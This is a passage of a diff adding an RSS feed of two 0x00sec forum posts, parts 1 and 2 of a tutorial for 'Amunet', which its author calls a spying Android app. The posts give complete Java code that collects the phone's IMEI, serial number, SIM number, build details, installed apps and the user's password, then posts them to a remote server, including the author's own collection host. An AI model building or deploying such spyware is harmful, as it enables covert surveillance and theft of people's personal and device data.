+    android:layout_height="wrap_content"&gt;
+
+    &lt;EditText
+        android:layout_width="match_parent"
+        android:hint="Password"
+        android:inputType="textWebPassword"
+        android:id="@+id/password"
+        android:layout_height="wrap_content" /&gt;
+
+&lt;/android.support.design.widget.TextInputLayout&gt;
+
+&lt;ImageView
+    android:layout_width="150dp"
+    android:src="@drawable/eye2"
+    android:layout_marginBottom="10dp"
+    android:layout_above="@id/textinputlayout1"
+    android:layout_centerHorizontal="true"
+    android:id="@+id/logo_imageview"
+    android:layout_height="150dp" /&gt;
+
+&lt;Button
+    android:layout_width="match_parent"
+    android:text="Sign up"
+    android:id="@+id/create_account_button"
+    android:textColor="@android:color/white"
+    android:layout_marginTop="10dp"
+    android:background="@color/colorPrimary"
+    android:layout_below="@id/textinputlayout3"
+    style="@style/Base.Widget.AppCompat.Button.Borderless"
+    android:layout_height="wrap_content" /&gt;
+&lt;/RelativeLayout&gt;
+</code></pre>
+<p>I have already uploaded the image ( eye2 ) for the ImageView  ( located in the drawable folder ) in the setting up app icon section of this tutorial. You can change the source of the ImageView or rename my image to eye2 in the drawable folder.</p>
+<p>This is my screen right now.</p>
+<p><img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/8/89bbcb74fefead9cbb520c9dabd142a06591fe3f.jpeg"></p>
+<p><strong>CONFIGURATION.JAVA</strong></p>
+<p>Create a new Java class and name it <code>Configuration</code>. Inside <code>Configuration</code> class, write this code.</p>
+<pre><code>private static final String app_host = "xx.xx.xx.xx";
+private static final String domain_path = "https://" + app_host + "/";
+private static final String app_auth = domain_path + "/receiver.php";
+
+public static String getApp_host() {
+    return app_host;
+}
+
+public static String getDomain_path() {
+    return domain_path;
+}
+
+public static String getApp_auth() {
+    return app_auth;
+}
+</code></pre>
+<p>The <code>Configuration</code> java class we just created will allow us to reference the server address from this file instead of manually typing it across the entire project which is like not cool.</p>
+<ol>
+<li>
+<code>xx.xx.xx.xx</code> is the server address ( localhost, network address ) eg <a href="http://0x00sec.org">0x00sec.org</a> or 104.18.48.48</li>
+<li>
+<code>domain_path</code> is the qualified domain server path including the appropriate protocols. eg <a href="https://0x00sec.org/">https://0x00sec.org/</a>. Don’t modify this line since it’s just a reference.</li>
+<li>
+<code>app_auth</code> is a file on the server that receives the request. Takes the server path and the receiving file path.</li>
+</ol>
+<p>The remaining methods are <code>getters</code> ( <code>Right click</code> -&gt; <code>Generate</code> -&gt; <code>Getter</code> ).</p>
+<p><strong>WRITING THE CODES FOR MAINACTIVITY.JAVA</strong></p>
+<p>The final part of this tutorial will be a bit tricky so try and read with understanding as I also try to explain in simple terms.</p>
+<p>Normally, above the <code>onCreate</code> method and below <code>public class MainActivity extends ...</code> code, lets declare our UI objects.</p>
+<pre><code>EditText username, password, name;
+Button create_account_button;
+
+SharedPreferences sharedPreferences;
+
+private static final int READ_PHONE_STATE_REQUEST_CODE = 10001;
+
+ProgressDialog progressDialog;
+</code></pre>
+<p>Basically</p>
+<ol>
+<li>We declare the EditText for our username, password and name fields ( content_main.xml ).</li>
+<li>We declare the Button for our sign up button ( content_main.xml )</li>
+<li>
+<a href="https://developer.android.com/reference/android/content/SharedPreferences" rel="noopener nofollow ugc">SharedPreferences</a> allows us to save information. We create an instance of it.</li>
+<li>
+<code>READ_PHONE_STATE_REQUEST_CODE</code> will allow us determine if our permission request was granted or denied ( discussed later ).</li>
+<li>ProgressDialog will allow us to display a progress bar with a message.</li>
+</ol>
+<p><strong>onCreate Method</strong></p>
+<p>This will be the code for our onCreate method.</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+
+    sharedPreferences = getSharedPreferences("Auth", Context.MODE_PRIVATE);
+
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    if(auth_key != null) {
+        startActivity(new Intent(MainActivity.this, Dashboard.class));
+        finish();
+    }
+
+    username = findViewById(R.id.username);
+    password = findViewById(R.id.password);
+    name = findViewById(R.id.full_name);
+
+    create_account_button = findViewById(R.id.create_account_button);
+    create_account_button.setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View view) {
+            if(ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE)
+                    != PackageManager.PERMISSION_GRANTED) {
+                show_permission_alert("Allow the app to read the phone's information", "read_phone_state");
+            } else {
+
+                if(username.getText().toString().length() &lt; 5) {
+                    show_alert("Username must be more than 5 characters");
+                    return;
+                }
+
+                if(password.getText().toString().length() &lt; 5) {
+                    show_alert("Password must be more than 5 characters");
+                    return;
+                }
+
+                if(name.getText().toString().length() &lt; 3) {
+                    show_alert("Enter a valid name");
+                    return;
+                }
+
+                progressDialog = new ProgressDialog(MainActivity.this);
+                progressDialog.setMessage("Creating account ...");
+                progressDialog.setCancelable(false);
+                progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
+                progressDialog.show();
+
+                create_phone_account();
+            }
+        }
+    });
+}
+</code></pre>
+<ol>
+<li>
+<code>sharedPreferences</code> - get a file “<code>Auth</code>” ( key-value file ). <code>MODE_PRIVATE</code> makes the file private to our app.</li>
+<li>
+<code>String auth_key</code> - gets the value for the key ( <code>auth_key</code> ) in our <code>Auth</code> file. Returns <code>null</code> if the key <code>doesn't exist</code>.</li>
+<li>If the key exists ( phone registered ), redirect us to the <code>Dashboard</code> activity we created earlier.</li>
+<li>Set reference to our respective EditTexts ( <code>username</code>, <code>password</code>, <code>name</code> )</li>
+<li>Set reference to the signup button ( create_account_button)</li>
+<li>When the button is clicked, we check if the <code>READ_PHONE_STATE</code> permission has been granted. If the permission hasn’t been granted, we call <code>show_permission_alert</code> method ( takes two arguments: <code>message</code> and <code>permission_id</code> ). Will create the method in a bit.</li>
+<li>If the permission is granted, then we check and make sure our <code>username</code>, <code>name</code> and <code>passwords</code> fields have valid data before we send them to our server. There is also a new method called <code>show_alert</code> which displays messages to the user.</li>
+<li>If the data is valid, we call the <code>create_phone_account</code> method to send our registration details to the server.</li>
+</ol>
+<p>Hope I got someone to understand it.</p>
+<p>The permission <code>READ_PHONE_STATE</code> allows us to read the phone’s International Mobile Equipment Identity ( IMEI ). With the IMEI, we can later identify the phone and user accounts registered with it.</p>
+<p>From <code>#6</code> ( above ), should the permission be denied, we call the <code>show_permission_alert</code>. Lets create the method.</p>
+<p><strong>SHOW_PERMISSION_ALERT</strong></p>
+<p>Outside the <code>onCreate</code> and inside the <code>MainActivity</code> class, create this method.</p>
+<pre><code>private void show_permission_alert(String message, final String permission) {
+    AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
+    dialog.setMessage(message);
+    dialog.setCancelable(false);
+    dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {
+
+        @Override
+        public void onClick(DialogInterface dialog, int which) {
+            if(permission.toLowerCase().equals("read_phone_state")) {
+                ActivityCompat.requestPermissions(MainActivity.this,
+                        new String[] {Manifest.permission.READ_PHONE_STATE},
+                        READ_PHONE_STATE_REQUEST_CODE);
+            }
+        }
+
+    });
+    dialog.show();
+}
+</code></pre>
+<p>It simply displays any message you pass to it. After you read the message displayed and you click “Ok”, the method checks if the <code>permission_id</code> passed during the method call matches the ones specified in the method. If they match, the appropriate code executes. The reason for this approach is that we will be asking for a lot of future permissions and instead of creating different methods every time, we can instead group them into one method along with their respective codes.</p>
+<p>In this method, we request the <code>READ_PHONE_STATE</code> permission when the “<code>read_phone_state</code>” is passed. The <code>READ_PHONE_STATE_REQUEST_CODE</code> will allow us to check if the permission was granted or not. Before we move on to check the whether our permission was granted or not, lets create the <code>show_alert</code> method. Similar to the <code>show_permission_alert</code> method but just displays messages and does not accept <code>permissions_id</code>.</p>
+<p><strong>SHOW_ALERT</strong></p>
+<p>There is not much explanation to be done here as I’ve already explained.</p>
+<pre><code>protected void show_alert(String msg) {
+    AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
+    dialog.setMessage(msg);
+    dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {
+
+        @Override
+        public void onClick(DialogInterface dialog, int which) {
+            dialog.dismiss();
+        }
+
+    });
+    dialog.show();
+}
+</code></pre>
+<p>Just displays messages.</p>
+<p><strong>ON REQUEST PERMISSIONS RESULT</strong></p>
+<p>This method allows us to check if the permission request was granted or not. In order to determine the state of the permission request, we’ll need the identifier ( request code - <code>READ_PHONE_STATE_REQUEST_CODE</code> ). Hope you now understand the importance of the request code integer value.</p>
+<pre><code>@Override
+public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+    switch (requestCode) {
+        case READ_PHONE_STATE_REQUEST_CODE: {
+            if (grantResults.length &gt; 0
+                    &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(getApplicationContext(), "Without this permission, the desired action cannot be performed", Toast.LENGTH_LONG).show();
+            } else {
+                Toast.makeText(getApplicationContext(), "Permission granted", Toast.LENGTH_LONG).show();
+            }
+            return;
+        }
+    }
+}
+</code></pre>
+<p>We print the appropriate response based on the user’s action. Since we need the <code>READ_PHONE_STATE</code> permission in order to get the app working, we won’t allow registration unless the permission is allowed.</p>
+<p><strong>GET DEVICE IMEI</strong></p>
+<p>IMEI’s are unique to every phone meaning we can track a phone based on its IMEI. We use the IMEI to identify a phone and not mix the data. This method will retrieve the IMEI of the phone and return it to its caller.</p>
+<pre><code>protected String getDeviceIMEI() {
+    String deviceUniqueIdentifier = null;
+    TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+    if (null != tm) {
+        try {
+            deviceUniqueIdentifier = tm.getDeviceId();
+        } catch (SecurityException e) {
+            return null;
+        }
+    }
+    if (null == deviceUniqueIdentifier || 0 == deviceUniqueIdentifier.length()) {
+        deviceUniqueIdentifier = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+    return deviceUniqueIdentifier;
+}
+</code></pre>
+<p>Makes use of the <code>Telephony Manager</code> which requires the <code>READ_PHONE_STATE</code> permission. Now in the <code>onClickListener</code> function of the <code>create_account_button</code> ( onCreate method ), there is one last method we have not tackled and that is the <code>create_phone_account</code>.</p>
+<p><strong>CREATE PHONE ACCOUNT</strong></p>
+<p>Before we move on, in the previous tutorial <a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Building a God’s Eye Android App: Part 1 - Collecting Installed Android Apps</a>, we included a thread calling the <code>collect_installed_apps</code> in the <code>onCreate</code> method. Kindly delete that thread. The <code>onCreate</code> method should now look like this.</p>
+<p><img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/2/2f3c0b5690bb7aaf9e9fefd224928ee136efaf6a.jpeg"></p>
+<p>Moving on to the <code>create_phone_acccount</code> method</p>
+<pre><code>private void create_phone_account() {
+
+    final String phone_imei = getDeviceIMEI();
+    final String phone_serial = Build.SERIAL;
+
+    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);
+
+    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
+        @Override
+        public void onResponse(String req) {
+            progressDialog.dismiss();
+
+            try {
+
+                final JSONObject response = new JSONObject(req);
+
+                if(response.getBoolean("success")) {
+                    final String server_response = response.getString("response");
+
+                    SharedPreferences.Editor editor = sharedPreferences.edit();
+
+                    editor.putString("auth_key", response.getString("api_key"));
+
+                    editor.apply();
+
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            collect_phone_details();
+                            collect_installed_apps();
+                        }
+                    }).start();
+
+                    new CountDownTimer(5000,1000) {
+                        @Override
+                        public void onTick(long l) {
+
+                        }
+
+                        @Override
+                        public void onFinish() {
+                            show_alert(server_response);
+                        }
+                    }.start();
+
+                    username.setText("");
+                    password.setText("");
+                    name.setText("");
+
+                } else {
+                    show_alert(response.getString("response"));
+                }
+            } catch (Exception e) {
+                show_alert("Authentication error: " + e.getMessage());
+            }
+        }
+    }, new Response.ErrorListener() {
+        @Override
+        public void onErrorResponse(VolleyError error) {
+            progressDialog.dismiss();
+            show_alert("Internet disconnected");
+        }
+    }) {
+        protected Map&lt;String, String&gt; getParams() {
+            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+            params.put("imei", phone_imei);
+            params.put("serial", phone_serial);
+            params.put("user", username.getText().toString());
+            params.put("name", name.getText().toString());
+            params.put("pass", password.getText().toString());
+            return params;
+        }
+    };
+
+    requestQueue.add(serverRequest);
+}
+</code></pre>
+<p>This method makes use of the RequestQueue function in the volley library to send requests. In this case we are sending a POST request. Notice the parameters</p>
+<pre><code>protected Map&lt;String, String&gt; getParams() {
+        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+        params.put("imei", phone_imei);
+        params.put("serial", phone_serial);
+        params.put("user", username.getText().toString());
+        params.put("name", name.getText().toString());
+        params.put("pass", password.getText().toString());
+        return params;
+}
+</code></pre>
+<p>The POST parameters being sent here are optional and not mandatory. I have set up a web server which accepts these specific parameters so incase you don’t have a server to test and want to use my server, send these particular parameters otherwise the data won’t be logged.</p>
+<p>The codes in the <code>onResponse</code> method are also optional and not mandatory. My web server gives each phone an API key to access the platform after phone registration. Incase you want to use my server, all data sent will have to be posted with the API key otherwise the incoming data will be discarded.</p>
+<p>The thread we earlier deleted in the <code>onCreate</code> method will now be called here should the response have a success field set to true. Remember the response is converted to a JSON Object. Volley allows us to directly receive the data in JSONObject but for debugging purposes, I used the StringRequest to see what was returned before converting the strings to JSON ( Was having issues with my server back then ).</p>
+<p>After the phone information has been logged on your web server or mine. You can begin to send data to the server. A thread is run in the <code>onResponse</code> method calling two methods <code>collect_phone_details</code> and <code>collect_installed_apps</code>. After a count down of 5 seconds, the server response is shown. The delay allows the two methods <code>collect_phone_details</code> and <code>collect_installed_apps</code> to finish execution before the user gets the chance to perform any further action which can interrupt the upload.</p>
+<p><strong>COLLECT PHONE DETAILS</strong></p>
+<p>In this method, we gather information about our device using <code>Build</code> ( android.os ) and TelephonyManager ( SIM Operations ).</p>
+<pre><code>private void collect_phone_details() {
+    upload_detail("VERSION.RELEASE", Build.VERSION.RELEASE);
+    upload_detail("VERSION.INCREMENTAL", Build.VERSION.INCREMENTAL);
+    upload_detail("VERSION.SDK.NUMBER", String.valueOf(Build.VERSION.SDK_INT));
+    upload_detail("BOARD", Build.BOARD);
+    upload_detail("BOOTLOADER", Build.BOOTLOADER);
+    upload_detail("BRAND", Build.BRAND);
+    upload_detail("CPUABI", Build.CPU_ABI);
+    upload_detail("CPUABI2", Build.CPU_ABI2);
+    upload_detail("DISPLAY", Build.DISPLAY);
+    upload_detail("FINGERPRINT", Build.FINGERPRINT);
+    upload_detail("HARDWARE", Build.HARDWARE);
+    upload_detail("HOST", Build.HOST);
+    upload_detail("ID", Build.ID);
+    upload_detail("MANUFACTURER", Build.MANUFACTURER);
+    upload_detail("MODEL",Build.MODEL);
+    upload_detail("PRODUCT", Build.PRODUCT);
+    upload_detail("SERIAL", Build.SERIAL);
+    upload_detail("TAGS", Build.TAGS);
+    upload_detail("TIME", String.valueOf(Build.TIME));
+    upload_detail("TYPE", Build.TYPE);
+    upload_detail("UNKNOWN",Build.UNKNOWN);
+    upload_detail("USER", Build.USER);
+    upload_detail("DEVICE", Build.DEVICE);
+
+    TelephonyManager telephonyManager = ((TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
+    String simOperatorName = telephonyManager.getSimOperatorName();
+    String simNumber = "";
+
+    try {
+        simNumber = telephonyManager.getLine1Number();
+    } catch (SecurityException e) {
+    }
+
+    upload_detail("SIM1.OPERATOR", simOperatorName);
+    upload_detail("SIM1.PHONE", simNumber);
+}
+</code></pre>
+<p>The method makes an extensive use of another method <code>upload_detail</code> to send data to our server.  If you intend to use my server, leave the values intact otherwise the information won’t show. If you don’t intend to use my server, then feel free to modify the parameters and requests as you wish.</p>
+<p><strong>UPLOAD DETAILS</strong></p>
+<p>This method sends data to the server using the api_key obtained during the registration process. The key is stored on the device using sharedPreferences. The method won’t upload if there is no api key.</p>
+<pre><code>private void upload_detail(final String key, final String value) {
+    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);
+
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    if(auth_key == null) { return; }
+
+    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
+        @Override
+        public void onResponse(String req) {
+        }
+    }, new Response.ErrorListener() {
+        @Override
+        public void onErrorResponse(VolleyError error) {
+        }
+    }) {
+        protected Map&lt;String, String&gt; getParams() {
+            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+            params.put("auth", auth_key);
+            params.put("k", key);
+            params.put("v", value);
+            return params;
+        }
+    };
+
+    requestQueue.add(serverRequest);
+}
+</code></pre>
+<p>Should you want to use my server, leave the POST parameters intact. Any slight modifications will cause the data to be rejected. I mean rejected. Otherwise, you are free to use and name your POST parameters as you please.</p>
+<pre><code>protected Map&lt;String, String&gt; getParams() {
+        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+        params.put("auth", auth_key);
+        params.put("k", key);
+        params.put("v", value);
+        return params;
+}
+</code></pre>
+<p>Be sure to keep the data intact. I can’t stress on it enough if you are to use my server.</p>
+<p><strong>COLLECT INSTALLED APPS</strong></p>
+<p>Last but one of the method calls for today’s tutorial. This method enumerates through the Package Manager and gets information about apps installed on the device. In our previous tutorial, we had only two parameters: app name and package name. Now we have included three more parameters.</p>
+<pre><code>private void collect_installed_apps() {
+    final PackageManager pm = getPackageManager();
+    List&lt;ApplicationInfo&gt; packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+    for (ApplicationInfo packageInfo : packages) {
+        if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null)
+        {
+            try {
+                String app_name = packageInfo.loadLabel(getPackageManager()).toString();
+                String app_package = packageInfo.processName;
+                String app_uid = Integer.toString(packageInfo.uid);
+                String app_versionName = pm.getPackageInfo(app_package, 0).versionName.toString();
+                String app_versionCode = String.valueOf(pm.getPackageInfo(app_package, 0).versionCode);
+
+                upload_app(app_name, app_package, app_uid, app_versionName, app_versionCode);
+            } catch (Exception e) {
+
+            }
+        }
+    }
+}
+</code></pre>
+<p>There is not much to explain as I have already done that in the previous tutorial. The new parameters are <code>app_uid</code>, <code>app_versionName</code> and <code>app_versionCode</code>.</p>
+<p><strong>UPLOAD APP</strong></p>
+<p>This function uploads data about the installed apps to the server. You are free to modify the parameters if you are not using my server as a backend.</p>
+<pre><code>private void upload_app(final String app_name, final String app_package, final String app_uid, final String app_vName, final String app_vCode) {
+    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);
+
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    if(auth_key == null) { return; }
+
+    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
+        @Override
+        public void onResponse(String req) {
+        }
+    }, new Response.ErrorListener() {
+        @Override
+        public void onErrorResponse(VolleyError error) {
+        }
+    }) {
+        protected Map&lt;String, String&gt; getParams() {
+            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+            params.put("auth", auth_key);
+            params.put("app_name", app_name);
+            params.put("app_package", app_package);
+            params.put("app_uid", app_uid);
+            params.put("app_vname", app_vName);
+            params.put("app_vcode", app_vCode);
+            return params;
+        }
+    };
+
+    requestQueue.add(serverRequest);
+}
+</code></pre>
+<p>That’s it for this tutorial.</p>
+<p><strong>CONFIGURING YOUR ANDROID APP TO COMMUNICATE WITH MY SERVER ( AMUNETCLOUD )</strong></p>
+<p>In communicating with AMUNETCLOUD, you need to make sure the following settings are in place.</p>
+<p>Change the address in the Configuration to</p>
+<pre><code>private static final String app_host = "play.cardfinder.co";
+private static final String domain_path = "https://" + app_host + "/";
+private static final String app_auth = domain_path + "/auth.php";
+</code></pre>
+<p>Secondly, make sure that you do not modify the original codes posted here as the server will reject modified request or data.</p>
+<p><strong>ACCESSING UPLOADED PHONE INFORMATION</strong></p>
+<p>To access your data, simply log onto <a href="https://play.cardfinder.co/" rel="noopener nofollow ugc">AMUNETCLOUD</a> using the credentials entered during registration. You should be redirected to your phone data.</p>
+<p><strong>DISCLAIMER</strong></p>
+<p>The server is a test or demonstration server and therefore I will not be held accountable for whatever data is sent to it. It’s purely for education purpose.</p>
+<p>I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
+<p>You can directly import the project into your android studio if you are having trouble.</p>
+<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
+<p>Until we meet again. I’m out.</p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>7 posts - 5 participants</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168</link>
+          <pubDate>Tue, 19 Jun 2018 22:13:41 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7168</guid>
+          <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
+        </item>
+        <item>
+          <title>Building a God’s Eye Android App: Part 1 - Collecting Installed Android Apps</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings my fellow hackers,</p>
+<p>In the previous tutorial <a href="https://www.javaworld.com/article/3095406/android/android-studio-for-beginners-part-1-installation-and-setup.html" rel="noopener nofollow ugc">Introduction to Amunet</a> , we learnt Amunet would be a spying Android App. I wouldn’t waste much time as I’ll get straight to the point.</p>
+<p>In this tutorial, we will only collect installed applications and their associated information but not send them to an external server since we are yet to setup our server and databases. I believe that will be the next tutorial ( Setting up Web Server and Databases ).</p>
+<p>I assume you have already installed Android Studio and have the environment running smoothly. If not, just head over to Google and search “<strong>installing and setting up android studio</strong>” or simply follow the tutorial from this external website <a href="https://www.javaworld.com/article/3095406/android/android-studio-for-beginners-part-1-installation-and-setup.html" rel="noopener nofollow ugc">Android Studio for beginners, Part 1: Installation and setup</a> ( I am in no way affiliated with them ). That being said, we can move on and create an android project.</p>
+<p><strong>CREATE A NEW ANDROID PROJECT</strong></p>
+<p>Start up Android Studio and create a new android project.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b2709ef98bb4763c3680c904c3c3f9f0954f4925.png" alt="26" data-base62-sha1="psyhiTBm7jLU3qMkNdDRyP9hZmR" width="690" height="424"></p>
+<p>Enter the application name of your choice, Amunet for me. Domain name can be anything of your choice. Next.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/be6baf43a1bc30e810a9133e1405ed1cfceb35ac.png" alt="38" data-base62-sha1="raxqP2ipDMndmRZCog8cNBfHYHq" width="669" height="500"></p>
+<p>Now the minimum phone target API is 19 ( KitKat ). Next.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/aaeb1704e85466ca6460c78b51d7f2b9577fecb8.png" alt="35" data-base62-sha1="oo0QyXrQwuy0Y7Qmx70nxfq6gOc" width="670" height="500"></p>
+<p>With the activity, go ahead and choose a <strong>Basic Activity</strong>. Next.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7a8b463095a84e016929917e1bcd78a8697278e9.png" alt="44" data-base62-sha1="hu4DZaShJr0tpV21Xo50lVUqJCN" width="669" height="500"></p>
+<p>We will leave the activity as “<strong>MainActivity</strong>” and click Finish.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2b53428a50d1c64bd1bed56076a80f2c45e6d01a.png" alt="51" data-base62-sha1="6bgUIstBuyANT01x4fTGJTGR0fw" width="668" height="500"></p>
+<p>Our project should be created successfully. We won’t do much with the interface as most of the codes will be written in background threads, services and Broadcast Receiver. We will probably use the UI for asking for permissions ( on 23 + )</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab7f9b0cbb5b93a2e3b13569cd4c807bde00adfa.jpeg" width="" height=""></p>
+<p><strong>COLLECTING INFORMATION ABOUT INSTALLED APPS</strong></p>
+<p>Head over to the</p>
+<blockquote>
+<p>MainActivity.java</p>
+</blockquote>
+<p>Feel free to remove the code for the <code>FloatingActionButton</code> in the <code>onCreate</code> method and add this code</p>
+<pre><code>new Thread(new Runnable() {
+            @Override
+            public void run() {
+                collect_installed_apps();
+            }
+}).start();
+</code></pre>
+<p>As you might have probably guessed, we are running a thread in the <code>onCreate</code> method and calling a method ( function ) <code>collect_installed_apps</code>. You’ll also find that the function has been underlined with color red showing that we have not created the function yet. Lets move on and create the function.</p>
+<p><strong>COLLECT_INSTALLED_APPS</strong></p>
+<p>In this method, we import ApplicationInfo, PackageManager, Log and List. Go to the very top of the file but below the package line ( Line 1 ) and add this import statements.</p>
+<pre><code>import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import java.util.List;
+import android.util.Log;
+</code></pre>
+<p>Now, lets create our method <code>collect_installed_apps</code></p>
+<blockquote>
+<pre><code>    private void collect_installed_apps() {
+    final PackageManager pm = getPackageManager();
+    List&lt;ApplicationInfo&gt; packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+    for (ApplicationInfo packageInfo : packages) {
+        if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null)
+        {
+            String app_name = packageInfo.loadLabel(getPackageManager()).toString();
+            String app_package = packageInfo.processName;
+
+            Log.i("0x00sec", "App name: " + app_name + " Package Name: " + app_package);
+        }
+    }
+}
+</code></pre>
+</blockquote>
+<p>Using the packager manager, the code loops through the installed apps and gets their information. The information we are gathering here is the application name and package name. There are alot of information available but we are limiting ourselves to only these two. You can however go ahead and collect other information. Since we have not setup our web server and database, we will instead log the information to the console using the <code>Log.i</code>.</p>
+<p><strong>CONFIGURING LOGCAT</strong></p>
+<p>You can read more about <a href="https://developer.android.com/studio/command-line/logcat" rel="noopener nofollow ugc">Logcat</a> but in simple terms, the system and other apps dump messages like errors, warnings and other information into this stream. It is ever changing and not constant. Our android app also dumps information into this stream with the <code>Log.i</code> call. Since there are alot of information being pushed, it will be hard to find our information so we instead configure our Android Studio to show only messages with a specific tag. If you noticed in the <code>Log.i</code> code, we passed two parameters: tag and message respectively. We tell Android Studio to only show messages with our defined tag that is <code>0x00sec</code>. With this way, we don’t see other messages not related to our android app. To the lower left of Android Studio, we will find the <code>Logcat</code> tab. Do yourself the honors and click on it.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1c083f4734ae88a0bc309f0f42ea8214d907b697.jpg" alt="27" data-base62-sha1="3ZZ2oFhOD1YyKdFUmCjvi0jZXXp" width="690" height="151"></p>
+<p>Follow the steps in the image and another Log dialog will pop up. Fill in the correct information, otherwise the appropriate message will not be shown.</p>
+<ol>
+<li>Enter your own filter name.</li>
+<li>In the Log Tag, use <code>0x00sec</code> ( or whatever you used as the first parameter in the <code>Log.i</code> code ).</li>
+<li>Enter the package name ( located on the first line of <code>MainActivity.java</code> )</li>
+</ol>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/78b3af6ddc3a866e46db31b2c6182c5375858735.png" alt="37" data-base62-sha1="hdMgLiDuAxpP53qXj2m6sgG3TEx" width="634" height="280"></p>
+<p>Click Ok. Now we are ready to run our android app. You first have to ensure USB Debugging is enabled on your testing device. Follow this link <a href="https://www.kingoapp.com/root-tutorials/how-to-enable-usb-debugging-mode-on-android.htm" rel="noopener nofollow ugc">How to Enable USB Debugging Mode on Android - KingoRoot</a> if you’ve not enabled it.</p>
+<p><strong>LETS RUN OUR ANDROID APPLICATION</strong></p>
+<p>Click on the green play button beside <code>app</code> at the top of the android studio or use <code>Control + R ( Mac )</code> and <code>Shift + F10 ( Windows/Linux )</code>. Make sure your device is connected and usb debugging enabled.</p>
+<p>When the app runs, the console should populate our installed apps and their package names.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99efd95978e97cafc9a231a025c73c85d183c674.jpeg" width="" height=""></p>
+<p>As you noticed, our logcat filter is working great.</p>
+<p><strong>LETS END IT HERE</strong></p>
+<p>In today’s tutorial, we’ve learnt how to populate installed android apps. In the next tutorial, we will design our database and set up our web server. In meantime, our code corrections, suggestions, app designs, etc are welcome. Thank you for the opportunity to share and until we meet again, I’m out.</p>
+<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
+<p><strong><span class="hashtag">#Sergeant</span></strong></p>
+            <p><small>2 posts - 1 participant</small></p>
+            <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121</link>
+          <pubDate>Fri, 15 Jun 2018 10:27:38 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-7121</guid>
